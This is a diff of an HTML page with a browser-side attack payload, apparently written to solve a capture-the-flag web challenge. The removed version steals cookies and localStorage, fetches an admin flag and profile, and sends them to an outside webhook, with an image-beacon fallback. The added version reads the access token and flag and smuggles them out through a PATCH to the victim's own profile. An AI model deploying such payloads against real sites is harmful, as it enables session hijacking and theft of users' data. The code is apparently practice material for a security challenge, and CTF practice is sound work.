@@ -2,46 +2,35 @@
 <html>
 <body>
 <script>
-    async function collectEverything() {
-        const webhook = https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";
-        let results = {};
+    async function solve() {
+        let flag = "Not Found";
+        let token = "No Token";
 
-        // 1. Grab cookies (if not HttpOnly)
-        results.cookies = document.cookie;
-
-        // 2. Grab Local Storage (Where tokens often hide)
-        results.localStorage = JSON.stringify(localStorage);
-
-        // 3. Try to fetch the Flag endpoint
         try {
-            const flagRes = await fetch('/api/admin/flag');
-            results.flag = await flagRes.text();
-        } catch (e) {
-            results.flagError = e.message;
-        }
-
-        // 4. Try to fetch the Admin's own full profile
-        try {
-            const meRes = await fetch('/api/auth/profile');
-            results.profile = await meRes.json();
-        } catch (e) {
-            results.profileError = e.message;
-        }
-
-        // 5. SEND EVERYTHING AT ONCE
-        // We use POST to ensure the data isn't cut off by URL length limits
-        fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(results)
-        });
-
-        // Backup: Also send via Query String just in case POST is blocked
-        const fallbackUrl = `${webhook}?data=${btoa(JSON.stringify(results)).substring(0, 1000)}`;
-        new Image().src = fallbackUrl;
+            // 1. Try to get the flag
+            const fReq = await fetch('/api/admin/flag');
+            if(fReq.ok) flag = await fReq.text();
+            
+            // 2. Try to get the session token
+            token = localStorage.getItem('accessToken') || "Not in LS";
+            
+            // 3. SAVE TO PROFILE (The "Notepad")
+            await fetch('/api/auth/profile', {
+                method: 'PATCH',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    "fullName": "DUMPING_DATA",
+                    "phoneNumber": flag.substring(0, 50),
+                    "address": {
+                        "street": token.substring(0, 50),
+                        "city": "Check_JSON_Now",
+                        "state": "LB"
+                    }
+                })
+            });
+        } catch (e) {}
     }
-
-    collectEverything();
+    solve();
 </script>
 </body>
 </html>
